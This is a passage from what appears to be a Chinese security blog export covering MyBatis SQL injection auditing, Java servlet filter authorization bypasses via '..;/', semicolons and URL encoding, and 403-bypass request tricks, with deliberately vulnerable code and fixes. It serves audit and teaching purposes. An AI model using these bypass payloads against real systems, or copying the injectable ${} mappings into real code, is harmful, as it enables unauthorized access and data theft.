operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%s: %s\n"</span><span class="token punctuation">,</span> res_name<span class="token punctuation">,</span> res_pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    rs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    connect<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-和-的区别"><a href="#0x05-和-的区别" class="headerlink" title="0x05 #{}和${}的区别"></a>0x05 #{}和${}的区别</h2><p>在MyBatis中，#{}在底层实现上使用”?”作为占位符来生成prepareStatement，也是参数化查询预编译的机制，而${}将传入的数据直接显示在SQL语句中，类似于字符串拼接，可能会导致SQL注入。</p><pre><code>SELECT * FROM user WHERE id=#&#123;id&#125;  //安全的写法SELECT * FROM user WHERE id=$&#123;id&#125;  //不安全的写法</code></pre><p>示例代码，在”userMapprt.xml”定义SQL映射文件中设置的是”${id}”不安全写法</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.mybatis.userMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getUser<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.mybatis.sql.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user where id=${id}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x06-Mybatis–常见SQL注入分析"><a href="#0x06-Mybatis–常见SQL注入分析" class="headerlink" title="0x06 Mybatis–常见SQL注入分析"></a>0x06 Mybatis–常见SQL注入分析</h2><p>1)、order by 查询</p><p>order by不能使用参数化查询的方式，只能使用字符拼接的方式，而在Mybatis中#{}是进行参数化查询的，要使用order by只能使用${}，如果开发者没有对此进行关键字过滤，则会导致SQL注入的产生。</p><pre><code>&lt;mapper namespace=&quot;org.joychou.mapper.UserMapper&quot;&gt;    &lt;select id=&quot;OrderByUsername&quot; resultMap=&quot;User&quot;&gt;        select * from users order by $&#123;id&#125;    &lt;/select&gt;    &lt;/mapper&gt;</code></pre><p>2)、like查询</p><p>Mybatis的like子句中使用#{}会报错，为了避免报错，只能使用${}，例如</p><pre><code>select * from users where name like &#39;%$&#123;user&#125;%&#39;;</code></pre><p>但${}会产生SQL注入，要避免SQL注入就要设置filter对其参数进行过滤。漏洞代码如下</p><pre><code>&lt;mapper namespace=&quot;org.joychou.mapper.UserMapper&quot;&gt;    &lt;select id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;        select * from users where username like &#39;%$&#123;_parameter&#125;%&#39;    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>3)、in参数</p><p>​    在Mybatis的in子句中使用#{}会将多个参数当作一个整体，示例代码如下</p><pre><code>&lt;mapper namespace=&quot;org.joychou.mapper.UserMapper&quot;&gt;    &lt;select id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;        select * from users where username in (#&#123;user&#125;)    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>在Mybatis的in子句中使用#{}参数化查询，会将“select * from users where username in (#{user})”转变成</p><p>“select * from users where username like (“‘user1’,’user2’,’user4’”)”，这样把”‘user1’,’user2’,’user4’”当成一个整体，无法查询到数据，为了避免这个问题，只能使用${}，而${}会进行字符拼接，如果没有经过任何过滤，则会导致SQL注入。</p><p>4)、总结</p><pre><code>1、Mybatis框架下审计SQL注入，重点关注在三个方面like，in和order by 2、xml方式编写sql时，可以先筛选xml文件搜索$,逐个分析，要特别注意mybatis-generator的order by注入 3、Mybatis注解编写sql时方法类似 4、java层面应该做好参数检查，假定用户输入均为恶意输入，防范潜在的攻击</code></pre><h2 id="0x07-SQL注入代码审计总结"><a href="#0x07-SQL注入代码审计总结" class="headerlink" title="0x07 SQL注入代码审计总结"></a>0x07 SQL注入代码审计总结</h2><p>总结了下面几种常见的关键字，我们可以通过这些关键字快速定位到SQL语句</p><pre><code>StatementcreateStatementPrepareStatementlike &#39;%$&#123;in($&#123;selectupdateinsert</code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Filter权限绕过总结</title>
      <link href="/2022/10/10/filter-quan-xian-rao-guo-zong-jie/"/>
      <url>/2022/10/10/filter-quan-xian-rao-guo-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​        挖掘越权或者无条件RCE时，很多系统大部分地方都做了权限控制，在java中，通常会通过filter进行接口的鉴权来达到权限控制的目的，这个时候对权限绕过的挖掘就显得格外重要了，这里就总结下自己在java中权限绕过的一些心得。</p><h2 id="0x01-代码实现"><a href="#0x01-代码实现" class="headerlink" title="0x01 代码实现"></a>0x01 代码实现</h2><p>web.xml</p><pre class="line-numbers language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!--servlet的配置入口--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.root.servlet.system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.root.servlet.login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--主页--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/main.do<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--登录--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/system/login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.root.filter.ossFileter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/main.do<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.root.filter.ossFileter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/system/login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写两个servlet<br>login.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">login</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"login page."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>system.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">system</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String url <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"this is main page!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写一个filter</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ossFileter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest servletRequest<span class="token punctuation">,</span> ServletResponse servletResponse<span class="token punctuation">,</span> FilterChain filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>        HttpServletRequest request <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>        String url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/system/login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".do"</span><span class="token punctuation">)</span> <span class="token operator">||</span> url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"admin=1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"unauthorized access"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        简单解释下filter的作用，这里使用getRequestURI()获取url路径并赋值给变量url，如果获取到的路径为/system/login，则直接进入doFilter()放行，当获取到的路径中含有”.do”或者”.action”，且cookie不含有”admin=1”时，则进行拦截。<br>直接访问main.do响应”unauthorized access”<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221010215456098.png"></p><h2 id="0x02-绕过思路"><a href="#0x02-绕过思路" class="headerlink" title="0x02 绕过思路"></a>0x02 绕过思路</h2><h3 id="1、-绕过"><a href="#1、-绕过" class="headerlink" title="1、../绕过"></a>1、../绕过</h3><p>我们先看看这块代码的逻辑</p><pre class="line-numbers language-java"><code class="language-java">String url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/system/login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​        当获取的路径是/system/login时，符合规则匹配，直接进入doFilter，这个时候我们可以使用../来跳转到根目录，即构造url是<code>http://192.168.3.2:8080/system/login/..;/..;/main.do</code>时，实际上访问的是<code>http://192.168.3.2:8080/main.do</code>，达到了我们权限绕过的目的。<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662788489288-0cf8508e-6698-4779-adaa-abfd8adeb0ea.png"><br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662788577527-8a719d92-d7c9-4e28-9d0c-43aee1ae2cd3.png"><br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662788587300-3f78463f-d398-48b8-9f0e-254945f5403f.png"></p><p>修复方式也很简单，只要在代码中加入判断路径是否含有”../“即可</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、分隔符绕过"><a href="#2、分隔符绕过" class="headerlink" title="2、分隔符绕过"></a>2、分隔符绕过</h3><p>上面的案例中，”/system.login”是一个白名单接口，访问它不需要经过filter，我们可以通过跳转的方式来绕过，那如果路径检测了非法符号的话呢？在URL中有个保留字符分号”;”，如果参数过多的情况下，使用分号；可以将其连接起来作为一个请求参数来传递，简单来说如果在URL中引入分隔符，通常是不会对正常接口造成影响的。<br>我们先看看以下的代码块</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".do"</span><span class="token punctuation">)</span> <span class="token operator">||</span> url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"admin=1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"unauthorized access"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当获取到的url结尾是”.do”或者是”.action”时，如果cookie不含有”admin=1”，则判断为未授权访问，意思就是如果我们的结尾不是”.do”或者”.action”，则直接放行，我们直接采用分隔符的方式绕过endsWith()的检测。<br>直接访问main.do响应未授权<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662789350360-074d81d6-e9d9-4450-9c94-880eb147d4f4.png"><br>加入分隔符就能绕过权限控制了<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662789384728-8e726d6e-1451-4ab1-8c52-448bcd1088c7.png"></p><h3 id="3、URL编码绕过"><a href="#3、URL编码绕过" class="headerlink" title="3、URL编码绕过"></a>3、URL编码绕过</h3><p>当filter走完对应的流程后，中间件会对请求的URL进行一次解码操作，然后再找到对应的Servlet进行访问，而在request.getRequestURL()和request.getRequestURI()这两个方法中并不会对请求的URL进行一次解码操作，也就是说我们可以对main.do进行一次url编码再引入两个方法中，这个时候规则匹配会失败，直接进入Servlet，从而达到权限绕过的目的。<br><code>http://192.168.3.2:8080/%6d%61%69%6e%2e%64%6f</code><br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1662792114023-488d34cf-a9ef-44cd-8e43-2c6badfba7ef.png"></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><code>https://blog.csdn.net/qq_38154820/article/details/106799046</code></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过403总结</title>
      <link href="/2022/10/10/rao-guo-403-zong-jie/"/>
      <url>/2022/10/10/rao-guo-403-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="1、通过数组包裹关键值"><a href="#1、通过数组包裹关键值" class="headerlink" title="#1、通过数组包裹关键值"></a><u><strong>#1、通过数组包裹关键值</strong></u></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/json{"emails":"random@gmail.com"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/json{"emails":["random@gmail.com"]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、用json包裹关键值"><a href="#2、用json包裹关键值" class="headerlink" title="#2、用json包裹关键值"></a><strong><u>#2、用json包裹关键值</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/json{"id":"1"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、修改请求方法"><a href="#3、修改请求方法" class="headerlink" title="#3、修改请求方法"></a><strong><u>#3、修改请求方法</u></strong></h2><p>我们可以通过修改请求方法来绕过403，可用的的请求方法有：【GET、POST、PATCH、TRACE】</p><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GET /userinfo?id=1 HTTP/1.1Host: api.host.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4、在路由中添加-更改-API-版本"><a href="#4、在路由中添加-更改-API-版本" class="headerlink" title="#4、在路由中添加/更改 API 版本"></a><strong><u>#4、在路由中添加/更改 API 版本</u></strong></h2><p>原数据1：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据1：</p><pre class="line-numbers language-html"><code class="language-html">POST /v1/userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原数据2：</p><pre class="line-numbers language-html"><code class="language-html">POST /v1/userinfo HTTP/1.1Host: api.host.comContent-Type: 